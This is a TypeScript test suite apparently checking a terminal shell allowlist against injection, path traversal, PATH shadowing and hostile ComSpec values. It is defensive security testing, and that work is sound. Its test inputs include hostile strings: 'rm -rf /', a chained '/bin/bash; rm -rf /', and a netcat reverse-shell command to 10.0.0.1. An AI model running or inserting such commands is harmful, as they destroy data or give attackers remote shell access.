import { describe, it, expect, afterEach } from 'vitest';
import { resolveShell } from '../src/terminals.js';

const TRUSTED = {
  cmd: 'C:\\Windows\\System32\\cmd.exe',
  powershell: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
  pwsh: 'C:\\Program Files\\PowerShell\\7\\pwsh.exe',
};

describe('resolveShell — shell allowlist (issue #5479)', () => {
  // Save and restore platform/env so tests are deterministic regardless of
  // host OS and don't leak mocked values into other suites.
  const originalPlatform = process.platform;
  const originalEnv = { ...process.env } as Record<string, string | undefined>;

  function mockPlatform(platform: string) {
    Object.defineProperty(process, 'platform', { value: platform, configurable: true });
  }

  function mockWin32Env() {
    process.env.SystemRoot = 'C:\\Windows';
    process.env.ProgramFiles = 'C:\\Program Files';
    delete process.env.ComSpec;
  }

  it('returns allowlisted posix shell when explicitly requested', () => {
    mockPlatform('linux');
    expect(resolveShell('/bin/zsh')).toBe('/bin/zsh');
    expect(resolveShell('/bin/bash')).toBe('/bin/bash');
    expect(resolveShell('/usr/bin/fish')).toBe('/usr/bin/fish');
    expect(resolveShell('/bin/dash')).toBe('/bin/dash');
  });

  it('drops a non-allowlisted shell and falls through to default', () => {
    mockPlatform('linux');
    delete process.env.SHELL;
    // Arbitrary executables must NOT be accepted
    expect(resolveShell('/usr/bin/python3')).toBe('/bin/bash');
    expect(resolveShell('/tmp/evil')).toBe('/bin/bash');
    expect(resolveShell('rm -rf /')).toBe('/bin/bash');
    expect(resolveShell('/bin/nc -e /bin/sh 10.0.0.1 4444')).toBe('/bin/bash');
  });

  it('respects SHELL env when no override is provided', () => {
    mockPlatform('linux');
    process.env.SHELL = '/bin/zsh';
    expect(resolveShell(null)).toBe('/bin/zsh');
    expect(resolveShell(undefined)).toBe('/bin/zsh');
    expect(resolveShell('')).toBe('/bin/zsh');
    delete process.env.SHELL;
  });

  it('trims whitespace before allowlist check', () => {
    mockPlatform('linux');
    expect(resolveShell('  /bin/bash  ')).toBe('/bin/bash');
    // Whitespace-padded arbitrary command still rejected
    expect(resolveShell('  /tmp/evil  ')).toBe('/bin/bash');
  });

  it('falls through when the allowlisted shell has trailing path traversal', () => {
    mockPlatform('linux');
    // Must NOT match via prefix or traversal
    expect(resolveShell('/bin/bash/../evil')).toBe('/bin/bash');
    expect(resolveShell('/bin/bash; rm -rf /')).toBe('/bin/bash');
  });

  it('win32: bare allowlisted names resolve to trusted absolute paths', () => {
    mockPlatform('win32');
    mockWin32Env();
    expect(resolveShell('cmd.exe')).toBe(TRUSTED.cmd);
    expect(resolveShell('CMD.EXE')).toBe(TRUSTED.cmd);
    expect(resolveShell('powershell.exe')).toBe(TRUSTED.powershell);
    expect(resolveShell('PowerShell.EXE')).toBe(TRUSTED.powershell);
    expect(resolveShell('pwsh.exe')).toBe(TRUSTED.pwsh);
  });

  it('win32: absolute overrides accepted only at canonical trusted locations', () => {
    mockPlatform('win32');
    mockWin32Env();
    expect(resolveShell(TRUSTED.cmd)).toBe(TRUSTED.cmd);
    expect(resolveShell(TRUSTED.powershell)).toBe(TRUSTED.powershell);
    expect(resolveShell(TRUSTED.pwsh)).toBe(TRUSTED.pwsh);
    // Allowlisted basename outside the trusted location (e.g. an
    // attacker-writable dir) is discarded and falls through to the default.
    expect(resolveShell('C:\\Users\\Public\\cmd.exe')).toBe(TRUSTED.cmd);
    expect(resolveShell('C:\\Windows\\Temp\\pwsh.exe')).toBe(TRUSTED.cmd);
  });

  it('win32: non-allowlisted executables rejected; default is trusted cmd.exe', () => {
    mockPlatform('win32');
    mockWin32Env();
    expect(resolveShell('evil.exe')).toBe(TRUSTED.cmd);
    expect(resolveShell('nc.exe')).toBe(TRUSTED.cmd);
    expect(resolveShell('C:\\Windows\\System32\\calc.exe')).toBe(TRUSTED.cmd);
  });

  it('win32: PATH shadowing — resolution never consults PATH, never returns a bare name', () => {
    mockPlatform('win32');
    mockWin32Env();
    // Simulate a hostile PATH whose first (writable, attacker-influenced)
    // entry shadows cmd.exe. resolveShell must not use PATH at all.
    process.env.PATH = 'C:\\Users\\Public\\bin;C:\\Windows\\System32';
    const cases: Array<string | null | undefined> = [
      'cmd.exe',
      'CMD.EXE',
      'powershell.exe',
      'pwsh.exe',
      'evil.exe',
      null,
      undefined,
      '',
    ];
    for (const requested of cases) {
      const resolved = resolveShell(requested);
      // Always a canonical absolute drive path…
      expect(resolved).toMatch(/^[A-Za-z]:\\/);
      // …never a bare executable name node-pty would PATH-resolve…
      expect(resolved).not.toBe('cmd.exe');
      expect(resolved).not.toBe('powershell.exe');
      expect(resolved).not.toBe('pwsh.exe');
      // …and never anything inside the shadow directory.
      expect(resolved.toLowerCase().startsWith('c:\\users\\public')).toBe(false);
    }
  });

  it('win32: hostile ComSpec discarded, canonical ComSpec honored', () => {
    mockPlatform('win32');
    mockWin32Env();
    process.env.ComSpec = 'C:\\Users\\Public\\cmd.exe';
    expect(resolveShell(null)).toBe(TRUSTED.cmd);
    process.env.ComSpec = TRUSTED.cmd;
    expect(resolveShell(null)).toBe(TRUSTED.cmd);
  });

  afterEach(() => {
    Object.defineProperty(process, 'platform', {
      value: originalPlatform,
      configurable: true,
    });
    // Restore the env snapshot exactly (delete keys added by mocks, restore
    // original values) so mutated SystemRoot/PATH/ComSpec never leak out.
    for (const key of Object.keys(process.env)) {
      if (!(key in originalEnv)) delete process.env[key];
    }
    for (const [key, value] of Object.entries(originalEnv)) {
      process.env[key] = value;
    }
  });
});
